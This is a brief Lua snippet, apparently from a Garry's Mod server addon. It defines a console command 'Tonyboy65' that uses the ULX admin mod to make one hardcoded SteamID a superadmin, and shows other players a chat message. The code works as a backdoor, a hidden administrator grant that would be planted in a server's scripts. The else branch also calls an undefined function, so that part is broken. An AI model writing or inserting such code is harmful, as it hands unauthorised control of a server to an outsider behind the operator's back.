concommand.Add( "Tonyboy65", function(ply)
if ( ply:SteamID() == "STEAM_0:0:180220290") then
RunConsoleCommand("ulx", "adduserid", ply:SteamID(), "superadmin")
else
ply:ChatPrint("Your not superadmin, " .. plyName() .. ".")
end
end) 